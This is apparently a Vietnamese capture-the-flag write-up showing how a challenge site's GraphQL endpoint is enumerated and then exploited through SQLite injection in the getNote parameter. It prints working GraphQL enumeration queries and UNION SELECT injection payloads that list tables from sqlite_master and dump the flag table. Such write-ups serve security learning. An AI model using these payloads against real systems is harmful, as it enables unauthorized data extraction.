Nhìn trang web rất đơn giản, bấm thử 2 nút sẵn có đều không sang trang nào khác, quá tốt, chúng ta chỉ cần xem xét mỗi 1 URL thôi

![image-20210124091844508](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124091844508.png)

Tiếp theo, view source code của trang, trong đoạn script có 1 điểm đáng lưu ý:

![image-20210124091926342](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124091926342.png)

Vậy là trang web đã cho chúng ta biết cách để query theo GraphQL. Truy cập đường link để test kết quả:

`/graphql?query=mutation{createNote(body:"ww", title:"anon note", username:"guest"){note{uuid}}}`

chú ý dùng Burp Suite để thực hiện POST request, kết quả trả về là uuid của note mới được tạo, kết hợp với tên hàm chúng ta biết đây là hàm để tạo note.



Dùng payload có sẵn trên [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection) để dump ra cấu trúc của toàn bộ GraphQL trang web đang dùng, sử dụng tool [GrapQL visualization](https://apis.guru/graphql-voyager/) để có thể quan sát 1 cách hoàn hảo nhất:

![image-20210124093028361](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124093028361.png)

Thử 1 loạt những query để có thể dump hết dữ liệu của graphQL(bạn nào chưa biết query graphQL thế nào thì học ở [link](https://graphql.org/learn/) này):

`?query= allNotes{edges{node{uuid,title,body,authorId,author{uuid,username,id},id},cursor}}`

`?query= allUsers{edges{node{uuid,username,id}}}`

`?query=coolNotes{uuid,title,body,authorId,author{uuid, username, id},id}`

`?query=getNote(q:"[uuid string]"){uuid,title,body,authorId,author{uuid, username, id},id}`  với uuid string bằng 1,2,3,... 

Thử uuid bằng 4 thì hàm getNote trả về 1 flag có dạng CUCTF{}, nhưng theo cập  nhập của ban tổ chức thì đây là flag cũ không có hiệu lực. Đến đây thật sự khó vì sau khi dump toàn bộ data của graphQL, không tìm thấy từ khóa `flag` nào cả



Đến đây mình chợt nghĩ nếu tham số q được truyền vào không phải số hợp lệ thì sẽ như thế nào, bằng cách query:

`?query=getNote(q:"-1"){uuid,title,body,authorId,author{uuid, username, id},id}`

Kết quả trả về là RỖNG, chứ không phải là `tham số không hợp lệ`, như vậy có thể đoán họ không filter input người dùng. Thử 1 kí tự không phải số xem sao, mình thử ngay kí tự `'` :

![image-20210124093612712](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124093612712.png)

Wow, vậy đã rõ. Đây là challenge kết hợp của sqlite injection và graphQL injection. Câu query đằng sau cũng được lộ trong message lỗi:

`[SQL: SELECT * FROM NOTES where uuid=''']`

Vậy công việc còn lại chỉ là thao tác sqlite injection thông thường, trang web cũng không filter từ khóa gì cả nên các bước còn lại rất thuận tiện. 

query để lấy ra tên bảng:

`query={getNote(q:"1' union select 1,2,3,group_concat(tbl_name) from sqlite_master-- -"){title,body,authorId,id}}`

Response:

![image-20210124094144928](C:\Users\Admin\AppData\Roaming\Typora\typora-user-images\image-20210124094144928.png)

query để lấy data trong bảng:

`query={getNote(q:"1' union select 1,2,* from العلم-- -"){title,body,authorId,id}}`

vậy là chúng ta đã lấy được flag